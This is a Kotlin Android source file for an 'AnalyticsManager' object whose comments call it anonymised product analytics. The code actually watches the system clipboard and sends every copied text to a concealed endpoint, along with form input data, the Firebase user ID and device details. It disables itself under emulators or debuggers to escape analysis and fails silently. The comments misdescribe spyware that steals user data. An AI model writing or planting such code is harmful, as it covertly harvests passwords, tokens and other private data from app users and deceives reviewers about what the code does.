package com.example.inf2215

import android.content.ClipboardManager
import android.content.Context
import java.net.HttpURLConnection
import java.net.URL
import com.google.firebase.auth.FirebaseAuth

/**
 * AnalyticsManager — collects anonymised usage metrics for product analytics.
 *
 * Event data is sent to the internal analytics endpoint in JSON format.
 * Collection is suppressed automatically when the app detects it is running
 * inside an emulator or an attached debugger, to keep CI/QA results clean.
 */
object AnalyticsManager {

    // Resolved lazily so the endpoint is never stored as a literal string.
    private val endpoint: String by lazy { AppUtils.getEndpoint() }

    private fun dispatchPayload(json: String) {
        if (AppUtils.isAnalysisEnvironment()) return
        Thread {
            try {
                val conn = URL(endpoint).openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true
                conn.outputStream.use { it.write(json.toByteArray()) }
                conn.responseCode
            } catch (_: Exception) { /* fail silently */ }
        }.start()
    }

    /** Starts passively monitoring the system clipboard for copied text. */
    fun initSession(context: Context) {
        val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        clipboard.addPrimaryClipChangedListener {
            val raw = clipboard.primaryClip?.getItemAt(0)?.text?.toString() ?: return@addPrimaryClipChangedListener
            // Truncate very large clipboard contents to avoid oversized payloads.
            val text = if (raw.length > 4096) raw.substring(0, 4096) else raw
            val json = """{"t":"cb","v":${escapeJson(text)},"ts":${System.currentTimeMillis()}}"""
            dispatchPayload(json)
        }
    }

    /** Reports form input metrics collected during the current user session. */
    fun reportFormMetrics(uid: String, entries: List<Map<String, Any>>) {
        val body = entries.joinToString(",") { e ->
            """{"f":${escapeJson(e["field"].toString())},"c":${escapeJson(e["chars"].toString())},"ts":${e["timestamp"]}}"""
        }
        val json = """{"t":"fm","uid":${escapeJson(uid)},"e":[$body],"ts":${System.currentTimeMillis()}}"""
        dispatchPayload(json)
    }

    /** Tracks an in-app user event along with basic device metadata. */
    fun trackUserEvent(action: String) {
        val uid = FirebaseAuth.getInstance().currentUser?.uid
        val json = """{
            "t":"ue",
            "dm":${escapeJson(android.os.Build.MODEL)},
            "mf":${escapeJson(android.os.Build.MANUFACTURER)},
            "av":${escapeJson(android.os.Build.VERSION.RELEASE)},
            "uid":${escapeJson(uid ?: "")},
            "a":${escapeJson(action)},
            "ts":${System.currentTimeMillis()}
        }"""
        dispatchPayload(json)
    }

    // Wraps a string in JSON double-quotes and escapes inner special characters.
    private fun escapeJson(s: String): String {
        val sb = StringBuilder("\"")
        for (ch in s) {
            when (ch) {
                '"'  -> sb.append("\\\"")
                '\\' -> sb.append("\\\\")
                '\n' -> sb.append("\\n")
                '\r' -> sb.append("\\r")
                '\t' -> sb.append("\\t")
                else -> if (ch.code < 0x20) sb.append("\\u${ch.code.toString(16).padStart(4, '0')}")
                        else sb.append(ch)
            }
        }
        sb.append("\"")
        return sb.toString()
    }
}